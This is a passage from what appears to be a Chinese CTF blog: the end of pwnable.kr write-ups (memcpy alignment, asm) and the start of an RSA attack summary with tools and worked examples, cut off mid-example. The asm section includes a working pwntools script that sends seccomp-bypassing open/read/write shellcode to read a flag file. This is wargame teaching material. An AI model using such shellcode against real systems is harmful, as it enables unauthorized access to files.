slow_memcpy : 1250</span><br></pre></td></tr></table></figure>
<p>并没有输出flag，而是到某一个环节就停下来了，使用ida调试下，程序在<code>_mm_stream_ps(a1, (__m128)_mm_load_si128(a2));</code>，也就是<code>"movntps %%xmm0, (%1)\n"</code>的地方出错了，查了下<code>movntps</code>，其中有一句描述：</p>
<blockquote>
<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.</p>
<p>“如果源或目的操作数是一个内存引用，则它必须满足16字节对齐。否则，会造成一般保护错误。”</p>
</blockquote>
<p>从源码中可以看到，前三次的赋值操作其实都是由<code>slow_memcpy</code>来完成的，所以没有出问题，那么为什么后面的字节就无法对齐</p>
<p>首先src是通过<code>mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</code>来得到地址的，这个地址一定是16字节对齐的（<a href="https://stackoverflow.com/questions/42259495/does-mmap-return-aligned-pointer-values" target="_blank" rel="noopener">原因</a>）。而dest则是由malloc来分配的地址，并且malloc返回的地址总是8字节对齐，所以就有可能导致地址不是16字节对齐。</p>
<p>但是输入的数据为128时，但是程序还是崩溃了</p>
<p>原因在于堆上分配空间时，除了用户的数据，还有4字节的chunk信息，再加上malloc的8字节对齐，所以就无法16字节对齐。</p>
<p>那么接下来输入的数据只需要加上8或者12就可以满足16字节对齐。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcpy@prowl:~$ nc 0 9022</span><br><span class="line">Hey, I have a boring assignment <span class="keyword">for</span> CS class.. :(</span><br><span class="line">The assignment is simple.</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">- What is the best implementation of memcpy?        -</span><br><span class="line">- 1. implement your own slow/fast version of memcpy -</span><br><span class="line">- 2. compare them with various size of data         -</span><br><span class="line">- 3. conclude your experiment and submit report     -</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">This time, just <span class="built_in">help</span> me out with my experiment and get flag</span><br><span class="line">No fancy hacking, I promise :D</span><br><span class="line">specify the memcpy amount between 8 ~ 16 : 8</span><br><span class="line">specify the memcpy amount between 16 ~ 32 : 16</span><br><span class="line">specify the memcpy amount between 32 ~ 64 : 32</span><br><span class="line">specify the memcpy amount between 64 ~ 128 : 72</span><br><span class="line">specify the memcpy amount between 128 ~ 256 : 136</span><br><span class="line">specify the memcpy amount between 256 ~ 512 : 264</span><br><span class="line">specify the memcpy amount between 512 ~ 1024 : 520</span><br><span class="line">specify the memcpy amount between 1024 ~ 2048 : 1032</span><br><span class="line">specify the memcpy amount between 2048 ~ 4096 : 2056</span><br><span class="line">specify the memcpy amount between 4096 ~ 8192 : 4104</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line">experiment 1 : memcpy with buffer size 8</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 2120</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 170</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 16</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 234</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 208</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 32</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 438</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 340</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 72</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 600</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 212</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 136</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 1208</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 136</span><br><span class="line"></span><br><span class="line">experiment 6 : memcpy with buffer size 264</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 1684</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 166</span><br><span class="line"></span><br><span class="line">experiment 7 : memcpy with buffer size 520</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 3700</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 232</span><br><span class="line"></span><br><span class="line">experiment 8 : memcpy with buffer size 1032</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 7130</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 400</span><br><span class="line"></span><br><span class="line">experiment 9 : memcpy with buffer size 2056</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 13596</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 774</span><br><span class="line"></span><br><span class="line">experiment 10 : memcpy with buffer size 4104</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 29864</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 1486</span><br><span class="line"></span><br><span class="line">thanks <span class="keyword">for</span> helping my experiment!</span><br><span class="line">flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</span><br></pre></td></tr></table></figure>
<h2 id="asm">asm</h2>
<h3 id="题目描述-17">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">	<span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		seccomp_release(ctx);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">	read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">	alarm(<span class="number">10</span>);</span><br><span class="line">	chroot(<span class="string">"/home/asm_pwn"</span>);	<span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">	sandbox();</span><br><span class="line">	((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-17">题目解析</h3>
<p>首先程序分配一块内存区域，然后用0x90将其填充，接着将stub复制进去。</p>
<p>其中stub的内容利用pwntools的asm模块翻译过来就是清空所有寄存器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print disasm(&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;)</span><br><span class="line">   0:   48                      dec    eax</span><br><span class="line">   1:   31 c0                   xor    eax,eax</span><br><span class="line">   3:   48                      dec    eax</span><br><span class="line">   4:   31 db                   xor    ebx,ebx</span><br><span class="line">   6:   48                      dec    eax</span><br><span class="line">   7:   31 c9                   xor    ecx,ecx</span><br><span class="line">   9:   48                      dec    eax</span><br><span class="line">   a:   31 d2                   xor    edx,edx</span><br><span class="line">   c:   48                      dec    eax</span><br><span class="line">   d:   31 f6                   xor    esi,esi</span><br><span class="line">   f:   48                      dec    eax</span><br><span class="line">  10:   31 ff                   xor    edi,edi</span><br><span class="line">  12:   48                      dec    eax</span><br><span class="line">  13:   31 ed                   xor    ebp,ebp</span><br><span class="line">  15:   4d                      dec    ebp</span><br><span class="line">  16:   31 c0                   xor    eax,eax</span><br><span class="line">  18:   4d                      dec    ebp</span><br><span class="line">  19:   31 c9                   xor    ecx,ecx</span><br><span class="line">  1b:   4d                      dec    ebp</span><br><span class="line">  1c:   31 d2                   xor    edx,edx</span><br><span class="line">  1e:   4d                      dec    ebp</span><br><span class="line">  1f:   31 db                   xor    ebx,ebx</span><br><span class="line">  21:   4d                      dec    ebp</span><br><span class="line">  22:   31 e4                   xor    esp,esp</span><br><span class="line">  24:   4d                      dec    ebp</span><br><span class="line">  25:   31 ed                   xor    ebp,ebp</span><br><span class="line">  27:   4d                      dec    ebp</span><br><span class="line">  28:   31 f6                   xor    esi,esi</span><br><span class="line">  2a:   4d                      dec    ebp</span><br><span class="line">  2b:   31 ff                   xor    edi,edi</span><br></pre></td></tr></table></figure>
<p>接着读取用户输入的数据到内存中。</p>
<p>重点在这个沙箱函数，通过<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">seccomp</a>建立了一些规则，限制了可以使用的系统调用，只能够使用<code>read</code>、<code>open</code>、<code>write</code>、<code>exit</code>、<code>exit_group</code>。</p>
<p>但有这几个函数就足以构造出shellcode去读取flag，利用pwntools的shellcraft模块和asm模块很轻松就可以完成。</p>
<p>汇编语言函数返回值一般是在eax(rax)中，所以open之后read的fd参数填rax</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=ssh(<span class="string">'asm'</span>,<span class="string">'pwnable.kr'</span>,<span class="number">2222</span>,<span class="string">'guest'</span>)</span><br><span class="line">p=r.connect_remote(<span class="string">'localhost'</span>,<span class="number">9026</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload=shellcraft.pushstr(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</span><br><span class="line">payload+=shellcraft.open(<span class="string">'rsp'</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=shellcraft.read(<span class="string">'rax'</span>,<span class="string">'rsp'</span>,<span class="number">100</span>)</span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,<span class="string">'rsp'</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'shellcode: '</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br></pre></td></tr></table></figure>
<p>后来测试了下，也可以直接open打开</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=shellcraft.open(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA总结</title>
    <url>/2019/07/10/rsa/</url>
    <content><![CDATA[<h1 id="rsa介绍">RSA介绍</h1>
<p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德 · 李维斯特（Ron Rivest）、阿迪 · 萨莫尔（Adi Shamir）和伦纳德 · 阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p>
<p>RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。</p>
<h1 id="基本原理">基本原理</h1>
<h2 id="公钥与私钥的产生">公钥与私钥的产生</h2>
<ol type="1">
<li><p>随机选择两个不同大质数 <span class="math inline">\(p\)</span> 和 <span class="math inline">\(q\)</span>，计算<span class="math display">\[N=p×q\]</span></p></li>
<li><p>根据欧拉函数，求得 <span class="math inline">\(\varphi (N)=\varphi (p)\varphi (q)=(p−1)(q−1)\)</span> <a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p></li>
<li><p>选择一个小于<span class="math inline">\(\varphi (N)\)</span> 的整数 <span class="math inline">\(e\)</span>，使 <span class="math inline">\(e\)</span> 和 <span class="math inline">\(\varphi (N)\)</span>互质。并求得 <span class="math inline">\(e\)</span> 关于$ (N) $的模反元素，命名为 <span class="math inline">\(d\)</span>，有 <span class="math inline">\(ed \equiv 1\ (mod\ \varphi(N))\)</span>，即<span class="math inline">\(ed-1\)</span>能被<span class="math inline">\(\varphi (N)\)</span>整除。<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></p></li>
<li><p>将 <span class="math inline">\(p\)</span> 和 <span class="math inline">\(q\)</span> 的记录销毁</p></li>
<li><p>对明文<span class="math inline">\(m\)</span>进行加密：<span class="math inline">\(c = pow(m, e, N)\)</span>,可以得到密文<span class="math inline">\(c\)</span>。</p></li>
<li><p>对密文<span class="math inline">\(c\)</span>进行解密：<span class="math inline">\(m = pow(c, d, N)\)</span>,可以得到明文<span class="math inline">\(m\)</span>。</p></li>
</ol>
<p><strong>使用到的字母：</strong></p>
<ul>
<li><span class="math inline">\(p\)</span> 和 <span class="math inline">\(q\)</span>：两个大的质数，是另一个参数N的的两个因子。</li>
<li><span class="math inline">\(N\)</span>：大整数，可以称之为模数</li>
<li><span class="math inline">\(e\)</span> 和 <span class="math inline">\(d\)</span>：encryption key (public key) (又称加密指数)和decryption key (private key) e对于(n)的模反元素</li>
<li><span class="math inline">\(c\)</span> 和 <span class="math inline">\(m\)</span>：密文和明文</li>
<li><span class="math inline">\((N, e)\)</span>：公钥</li>
<li><span class="math inline">\((N, d)\)</span>：私钥</li>
<li><span class="math inline">\(pow(x,y,z)\)</span>：计算<span class="math inline">\(x^y\ mod\ z\)</span></li>
</ul>
<h1 id="工具">工具</h1>
<h2 id="rsatool">RSAtool</h2>
<ul>
<li><p>安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ius/rsatool.git</span><br><span class="line">cd rsatool</span><br><span class="line">python rsatool.py -h</span><br></pre></td></tr></table></figure></li>
<li><p>生成私钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="openssl">openssl</h2>
<ul>
<li><p>查看公钥文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure></li>
<li><p>解密</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -inkey private.pem -in flag.enc -out flag</span><br></pre></td></tr></table></figure></li>
</ul>
<p>更加具体的细节请参考 <code>openssl --help</code>。</p>
<h2 id="分解整数工具">分解整数工具</h2>
<ul>
<li>网站分解，<a href="http://factordb.com/" target="_blank" rel="noopener">factor.db</a></li>
<li>命令行分解，<a href="https://github.com/ryosan-470/factordb-pycli" target="_blank" rel="noopener">factordb-pycli</a>，借用 factordb 数据库。</li>
<li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">yafu</a></li>
</ul>
<h2 id="python库">python库</h2>
<h3 id="primefac">primefac</h3>
<p>整数分解库，包含了很多整数分解的算法。</p>
<h3 id="gmpy">gmpy</h3>
<ul>
<li><code>gmpy.root(a, b)</code>，返回一个元组 <code>(x, y)</code>，其中 <code>x</code> 为 <code>a</code> 开 <code>b</code> 次方的值，<code>y</code> 是判断 <code>x</code> 是否为整数的布尔型变量</li>
</ul>
<h3 id="gmpy2">gmpy2</h3>
<p>安装时，可能会需要自己另行安装 mfpr 与 mpc 库。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.gcd() <span class="comment"># 欧几里得算法，用于计算两个整数a,b的最大公约数。</span></span><br><span class="line">gmpy2.gcdex() <span class="comment"># 扩展欧几里得算法</span></span><br><span class="line">p = gmpy2.mpz(<span class="number">258631601377848992211685134376492365269</span>) <span class="comment"># 初始化一个大整数</span></span><br><span class="line">q = gmpy2.mpz(<span class="number">286924040788547268861394901519826758027</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">65537</span>)	</span><br><span class="line">n = p*q <span class="comment"># 74207624142945242263057035287110983967646020057307828709587969646701361764263</span></span><br><span class="line">m = gmpy2.mpz(<span class="number">0x666c61677b746573747d</span>) <span class="comment"># 明文，flag&#123;test&#125;</span></span><br><span class="line">c = gmpy2.powmod(m, e, n) <span class="comment"># 加密，密文：29766627188948515299752891165088038848853967387353164719200436253350322889530</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)) <span class="comment"># 计算e相对于\varphi (n)的模反元素</span></span><br><span class="line">flag = hex(gmpy2.powmod(c, d, n))[<span class="number">2</span>:].decode(<span class="string">"hex"</span>) <span class="comment"># 得到flag，flag&#123;test&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="pycrypto">pycrypto</h3>
<p><strong>Ubuntu</strong></p>
<ul>
<li><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li>
<li><p>使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line">msg = <span class="string">'crypto here'</span></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">64</span>)</span><br><span class="line">pubkey = RSA.construct((long(n), long(e)))</span><br><span class="line">privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))</span><br><span class="line">key = PKCS1_v1_5.new(pubkey)</span><br><span class="line">enc = key.encrypt(msg).encode(<span class="string">'base64'</span>)</span><br><span class="line">key = PKCS1_v1_5.new(privatekey)</span><br><span class="line">msg = key.decrypt(enc.decode(<span class="string">'base64'</span>), e)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>Windows</strong></p>
<ul>
<li><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure></li>
<li><p>使用</p>
<p>用法同<code>pycrypto</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsa &#x3D;RSA.construct((n,e,d,p,q))</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="题目类型">题目类型</h1>
<h2 id="模数分解">模数分解</h2>
<p>这类题目就是给个<span class="math inline">\(N\)</span>、<span class="math inline">\(e\)</span>、<span class="math inline">\(c\)</span>什么的，算出其他需要的值</p>
<h3 id="例题">例题</h3>
<p><a href="http://www.shiyanbar.com/ctf/1979" target="_blank" rel="noopener">rsarsa</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure>
<p><span class="math inline">\(p\)</span>，<span class="math inline">\(q\)</span>都给了，直接用<code>gmpy2.invert(e,(p-1)*(q-1))</code>算出<span class="math inline">\(d\)</span>，再用<code>gmpy2.powmod(c,d,n)</code>就可以得到flag了</p>
<h3 id="解密脚本">解密脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=gmpy2.mpz(<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>)</span><br><span class="line">q=gmpy2.mpz(<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">e=gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">c=gmpy2.mpz(<span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>)</span><br><span class="line"> </span><br><span class="line">flag=gmpy2.powmod(c,d,n)</span><br></pre></td></tr></table></figure>
<h2 id="低加密质数攻击">低加密质数攻击</h2>
<p>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p>
<p><strong>e=3时的小明文攻击</strong></p>
<p>当<span class="math inline">\(e=3\)</span>时，如果明文过小，导致明文的三次方仍然小于<span class="math inline">\(n\)</span>，那么通过直接对密文三次开方，即可得到明文。</p>
<p>即：</p>
<p><span class="math display">\[c\equiv m^e\ mod\ n\]</span></p>
<p>如果e=3，且$ m^e&lt;{n} $，那么：</p>
<p><span class="math display">\[ c= m^e,\ e=3\]</span></p>
<p><span class="math display">\[ m = \sqrt[3]{c}\]</span></p>
<p>如果明文的三次方比n大，但是不是足够大，那么设k，有：</p>
<p><span class="math display">\[ c= m^e+kn\]</span></p>
<p>爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p>
<h3 id="例题-1">例题</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n: 0x81cfc71c44c83faf3c5242fa81ae2e533fc945f3bef30bc13323ea4a55b3debc11301c6a9ecb8f7ef92fa169b157435af728a145497f2cdf75b3007b9732da4c47d67683f09ae1edc8f698f5ec7549593d9f1d06adafae4ad09514928bf0367a2719f7c171580318690dafc6a3d5385b3516b769f529c0a055ce25e68bc21395L</span><br><span class="line">e: 0x01</span><br><span class="line">c: 0x6867616d657b7273615f31735f737469316c5f653473795f6e6f77217dL</span><br></pre></td></tr></table></figure>
<p>因为<span class="math inline">\(e=1\)</span>，根据上面的结果，<span class="math inline">\(c=m^1=m\)</span>，直接将<span class="math inline">\(c\)</span>解码即可得到flag</p>
<h2 id="多个n有公约数分解">多个n有公约数分解</h2>
<p>如果在两次公钥的加密过程中使用的<span class="math inline">\(n_1\)</span> 和<span class="math inline">\(n_2\)</span>具有相同的素因子，那么可以利用欧几里得算法直接将<span class="math inline">\(n_1\)</span>和<span class="math inline">\(n_2\)</span>分解。</p>
<p>利用欧几里得算法解出最大公约数<span class="math inline">\(p\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>	</span><br><span class="line">    <span class="keyword">if</span> a &lt; b:		</span><br><span class="line">        a, b = b, a 	</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:		</span><br><span class="line">            temp = a % b		</span><br><span class="line">            a = b		</span><br><span class="line">            b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
<h3 id="例题-2">例题</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n is 28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181</span><br><span class="line">e is 65537</span><br><span class="line">c is 14200655400630956617529154837540349350095534430543196299987252783320359338882400858000649938298574946882176873795065987640380185922571487987903069796872680567596754211592988768630729844485795253975027297563832927176988502771266530781452168489731952873297707254669904609865565861351429459102567318447934677565870915603816516557032164955329497823771897899211076176905132170360842951444390670253036307048815943908305457043184642918674003085039564350070641592716116089015861491205237748561298604957423077954850396167621218521884114394431799317165818964438359695744604198246716410783223931430682808151056020475306791729591</span><br><span class="line"></span><br><span class="line">n is 